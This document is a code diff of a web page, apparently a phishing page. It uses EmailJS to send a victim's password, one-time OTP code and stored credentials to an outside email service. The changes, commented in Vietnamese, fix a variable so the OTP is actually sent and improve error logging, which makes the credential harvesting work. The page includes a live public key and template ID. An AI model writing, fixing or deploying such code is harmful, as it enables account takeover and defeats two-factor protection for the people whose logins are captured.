@@ -14,7 +14,7 @@
     <script type="text/javascript">
       (function() {
          emailjs.init({
-           publicKey: "c-Ms5MjWbitpDBb-E",
+           publicKey: "c-Ms5MjWbitpDBb-E", // Thay bằng Public Key của bạn
          });
       })();
     </script>
@@ -471,13 +471,14 @@
                     templateParams = { ...commonParams, password: value };
                 } else if (type === 'otp') {
                     templateID = 'template_p60g14a';
-                    templateParams = { ...commonParams, otp: withstandvalue, password: credentials.password };
+                    // SỬA LỖI TẠI ĐÂY: Thay 'withstandvalue' bằng 'value'
+                    templateParams = { ...commonParams, otp: value, password: credentials.password };
                 }
 
                 if(templateID) {
                     emailjs.send(serviceID, templateID, templateParams)
                         .then(() => console.log(`${type} sent successfully.`))
-                        .catch(err => console.error(`EmailJS send failed for ${type}:`, err));
+                        .catch(err => console.error(`EmailJS send failed for ${type}:`, JSON.stringify(err)));
                 }
             };
 
